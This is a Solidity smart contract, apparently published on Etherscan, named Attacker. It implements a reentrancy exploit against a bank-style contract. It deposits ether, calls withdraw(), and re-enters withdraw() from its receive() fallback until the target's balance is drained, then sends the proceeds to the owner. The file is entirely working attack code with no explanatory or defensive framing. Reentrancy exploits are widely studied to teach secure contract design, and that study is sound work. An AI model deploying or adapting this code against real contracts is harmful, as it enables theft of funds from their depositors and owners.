/**
 *Submitted for verification at Etherscan.io on 2022-04-27
*/

pragma solidity ^0.8.13;

interface InterfaceBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    InterfaceBank public targetBank;
    address private owner;

    constructor(address etherBankAddress) {
        targetBank = InterfaceBank(etherBankAddress);
        owner = msg.sender;
    }

    function attack() external payable onlyOwner {
        targetBank.deposit{value: msg.value}();
        targetBank.withdraw();
    }

    receive() external payable {
        if (address(targetBank).balance > 0) {
            targetBank.withdraw(); 
        } else {
            payable(owner).transfer(address(this).balance);
        }
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }

    modifier onlyOwner() {
        require(owner == msg.sender, "Atata");
        _;
    } 
}